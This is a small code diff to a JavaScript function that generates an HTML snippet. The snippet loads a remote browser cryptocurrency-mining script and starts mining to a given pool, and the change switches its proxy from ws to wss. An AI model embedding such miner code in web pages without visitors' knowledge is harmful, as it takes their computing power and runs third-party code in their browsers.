@@ -6,7 +6,7 @@ function getCode(host, port, username, password) {
     if (username == '') username = '[USERNAME]';
     if (password == '') password = '[PASSWORD]';
 
-    return `<script src="https://lisennk.github.io/OpenHive/ch/m.js?proxy=ws://${platform}?pool=${host}:${port}:${password}"></script>
+    return `<script src="https://lisennk.github.io/OpenHive/ch/m.js?proxy=wss://${platform}?pool=${host}:${port}:${password}"></script>
 <script>
     // Start mining
     var m = CH.Anonymous('${username}');
